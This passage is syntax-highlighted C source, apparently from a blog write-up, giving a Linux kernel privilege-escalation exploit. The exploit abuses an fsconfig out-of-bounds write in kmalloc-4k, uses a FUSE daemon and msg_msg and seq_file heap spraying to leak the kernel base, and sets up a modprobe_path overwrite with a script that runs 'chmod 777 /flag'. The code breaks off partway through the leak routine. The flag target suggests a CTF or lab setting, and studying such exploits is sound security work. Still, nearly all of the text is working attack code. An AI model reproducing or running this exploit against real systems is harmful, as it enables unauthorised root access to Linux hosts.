class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FUSE_USE_VERSION 34</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fuse.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_SIZE 4096</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_SIZE 32</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TYPE <span class="hljs-string">&#x27;A&#x27;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_TYPE    <span class="hljs-string">&#x27;A&#x27;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_TYPE  <span class="hljs-string">&#x27;B&#x27;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VICTIM_MSG_TYPE     0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TAG     0xAAAAAAAA</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_QUEUE_NUM 0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEQ_FILE_NUM 0x100</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_HOLE_SPACE 8</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_FILE_NAME <span class="hljs-string">&quot;a3fuse_evil_file&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_DAEMON_NAME <span class="hljs-string">&quot;evil_fuse&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_MOUNT_PATH <span class="hljs-string">&quot;/tmp/evil&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_FILE_PATH EVIL_MOUNT_PATH <span class="hljs-string">&quot;/&quot;</span> EVIL_FILE_NAME</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) <br>               + SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msgseg)];<br>&#125; primary_msg;<br><br><span class="hljs-type">char</span> *evil_args[] = &#123; EVIL_DAEMON_NAME, EVIL_MOUNT_PATH, <span class="hljs-literal">NULL</span> &#125;;<br><span class="hljs-type">int</span> exp_fs_fd;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_readdir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-type">void</span>* buf, </span><br><span class="hljs-params">                               <span class="hljs-type">fuse_fill_dir_t</span> filler, <span class="hljs-type">off_t</span> offset, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info* fi, </span><br><span class="hljs-params">                               <span class="hljs-keyword">enum</span> fuse_readdir_flags flags)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_getattr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-keyword">struct</span> stat *stbuf, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_read</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                            <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_write</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                             <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fuse_operations</span> <span class="hljs-title">a3fuse_evil_ops</span> =</span> &#123;<br>    .readdir = a3fuse_evil_readdir,<br>    .getattr = a3fuse_evil_getattr,<br>    .read = a3fuse_evil_read,<br>    .write = a3fuse_evil_write,<br>&#125;;<br><br><span class="hljs-type">char</span> cat_flag[] = <span class="hljs-string">&quot;#!/bin/sh\nchmod 777 /flag&quot;</span>;<br><br><span class="hljs-type">size_t</span> kernel_base = <span class="hljs-number">0xffffffff81000000</span>, kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\n\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, </span><br><span class="hljs-params">             <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">readMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">writeMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    *(<span class="hljs-type">long</span>*)msgp = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">peekMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> __msgsz = msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>);<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, __msgsz, msgtyp, <br>                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">buildMsg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next, <span class="hljs-type">uint64_t</span> m_list_prev, </span><br><span class="hljs-params">              <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts,  <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_readdir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-type">void</span>* buf, </span><br><span class="hljs-params">                               <span class="hljs-type">fuse_fill_dir_t</span> filler, <span class="hljs-type">off_t</span> offset, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info* fi, </span><br><span class="hljs-params">                               <span class="hljs-keyword">enum</span> fuse_readdir_flags flags)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(path, <span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> -ENOENT;<br>    &#125;<br><br>    filler(buf, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    filler(buf, <span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    filler(buf, EVIL_FILE_PATH, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_getattr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-keyword">struct</span> stat *stbuf, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(path, <span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>        stbuf-&gt;st_mode = <span class="hljs-number">0755</span> | S_IFDIR;<br>        stbuf-&gt;st_nlink = <span class="hljs-number">2</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(path + <span class="hljs-number">1</span>, EVIL_FILE_PATH)) &#123;<br>        stbuf-&gt;st_mode = <span class="hljs-number">0644</span> | S_IFREG;<br>        stbuf-&gt;st_nlink = <span class="hljs-number">1</span>;<br>        stbuf-&gt;st_size = <span class="hljs-number">0x1000</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> -ENOENT;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_read</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                            <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span><br>&#123;<br>    <span class="hljs-comment">/* I only set one page there */</span><br>    <span class="hljs-type">char</span> evil_buf[<span class="hljs-number">0x1000</span>], fake_msg[<span class="hljs-number">0x100</span>];<br>    <br>    <span class="hljs-keyword">if</span> (offset &gt;= <span class="hljs-number">0x1000</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (offset + size &gt; <span class="hljs-number">0x1000</span>) &#123;<br>        size = <span class="hljs-number">0x1000</span> - offset;<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(evil_buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(evil_buf));<br>    <span class="hljs-built_in">strcpy</span>(evil_buf, <span class="hljs-string">&quot;arttnba3/tmp/evil.sh&quot;</span>);<br>    <span class="hljs-built_in">memcpy</span>(buf, evil_buf + offset, size);<br><br>    <span class="hljs-comment">/* fake msg_msg with `next` pointing to modprobe_path*/</span><br>    buildMsg(fake_msg, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>, <br>             *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">0xffffffff82891160</span> + kernel_offset, <br>             *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>);<br>    fsconfig(exp_fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;&quot;</span>, fake_msg + <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_write</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                             <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span><br>&#123;<br>    <span class="hljs-comment">/* I only set one page there */</span><br>    <span class="hljs-type">char</span> evil_buf[<span class="hljs-number">0x1000</span>];<br>    <br>    <span class="hljs-keyword">if</span> (offset &gt;= <span class="hljs-number">0x1000</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (offset + size &gt; <span class="hljs-number">0x1000</span>) &#123;<br>        size = <span class="hljs-number">0x1000</span> - offset;<br>    &#125;<br><br>    <span class="hljs-built_in">memcpy</span>(evil_buf + offset, buf, size);<br>    <br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief make an out-of-bound write to the next object in kmalloc-4k,</span><br><span class="hljs-comment"> * note that the buf before will always be appended to a &quot;,=&quot;,</span><br><span class="hljs-comment"> * for a ctx-legacy_data with 4095 bytes&#x27; data, the &#x27;,&#x27; will be the last byte,</span><br><span class="hljs-comment"> * and the &#x27;=&#x27; will always be on the first by of the object nearby</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * @param buf buf to write to next object</span><br><span class="hljs-comment"> * @return int - the fd for filesystem context</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">oobWritePrepare</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br><br>    <span class="hljs-comment">/* get a filesystem context */</span><br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to fsopen()!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * fulfill the ctx-&gt;legacy_data to 4095 bytes, </span><br><span class="hljs-comment">     * so that the (PAGE_SIZE - 2 - size) overflow</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">255</span>; i++) &#123;<br>        fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;pwnnn&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> fs_fd;    <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">leakKernelBase</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br>    <span class="hljs-type">int</span> msqid[MSG_QUEUE_NUM];<br>    <span class="hljs-type">int</span> seq_fd[SEQ_FILE_NUM];<br>    <span class="hljs-type">char</span> m_ts_buf[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">uint64_t</span> buf[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-comment">/* create message queue */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] create message queue for data leaking...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* spray msg_msg in half of message queues and seq_file */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray msg_msg in half of message queues and seq_files...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (MSG_QUEUE_NUM / <span class="hljs-number">2</span>); i++) &#123;<br>        <span class="hljs-built_in">memset</span>(&amp;primary_msg.mtext, <span class="hljs-string">&#x27;A&#x27;</span> + i, <span class="hljs-keyword">sizeof</span>(primary_msg) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>));<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i],&amp;primary_msg, <span class="hljs-keyword">sizeof</span>(primary_msg),MSG_TYPE) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at sending msg_msg on %d queue\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to send message!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> ((seq_fd[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at opening %d seq_file\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to open /proc/self/stat!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* fsconfig() to set the size to the &amp;msg_msg-&gt;m_ts */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fsconfig() to set the size to the &amp;msg_msg-&gt;m_ts...&quot;</span>);<br>    fs_fd = 